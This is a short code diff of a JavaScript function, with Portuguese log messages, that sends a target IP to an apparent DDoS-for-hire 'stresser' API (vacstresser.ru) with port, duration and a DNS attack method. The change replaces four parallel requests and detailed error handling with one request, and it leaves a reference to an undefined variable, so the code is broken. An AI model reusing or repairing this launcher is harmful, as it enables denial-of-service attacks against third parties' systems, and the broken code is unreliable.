@@ -56,25 +56,13 @@ async function clear() {
 async function sendApiRequest(ip) {
     const url = `https://api.vacstresser.ru/api?key=${token}&host=${ip}&port=80&time=30&method=DNS`;
     console.log(`URL da API: ${url}`);
-    const requests = Array(4).fill(url).map(u => axios.get(u));
+    const response = await axios.get(url);
     
     try {
         await axios.all(requests);
         console.log(`Requisição enviada para o IP: ${ip}`);
     } catch (error) {
-        if (error.response) {
-            const status = error.response.data.status;
-            const errorMessage = error.response.data.message || 'Mensagem de erro não disponível';
-            if (status === 'error') {
-                console.error(`Erro ao enviar requisição para o IP: ${ip}. Mensagem: ${errorMessage}`);
-            } else {
-                console.log(`Resposta da API para o IP: ${ip}. Status: ${status}`);
-            }
-        } else if (error.request) {
-            console.error(`Erro ao enviar requisição para o IP: ${ip}. Sem resposta da API.`);
-        } else {
-            console.error(`Erro ao configurar a requisição para o IP: ${ip}. Mensagem: ${error.message}`);
-        }
+        console.error('Erro completo:', error);
     }
 }
 
